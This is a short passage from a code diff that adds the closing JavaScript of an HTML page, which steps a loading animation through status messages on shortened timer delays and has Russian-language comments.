+                currentStep++;
+            }, 300);
+        }
+
+        // Запуск анимации (ускоренные задержки)
+        setTimeout(() => {
+            advanceLoader();
+            let stepIndex = 1;
+            // Ускоренные задержки (вместо 700-1300 теперь 400-600)
+            const delays = [400, 500, 400, 500, 400, 500, 400, 500, 400, 500];
+
+            function scheduleNext() {
+                if (stepIndex >= statusMessages.length) return;
+                const delay = delays[stepIndex - 1] || 400;
+                setTimeout(() => {
+                    advanceLoader();
+                    stepIndex++;
+                    scheduleNext();
+                }, delay);
+            }
+            scheduleNext();
+        }, 600);
+    </script>
+</body>
+</html>
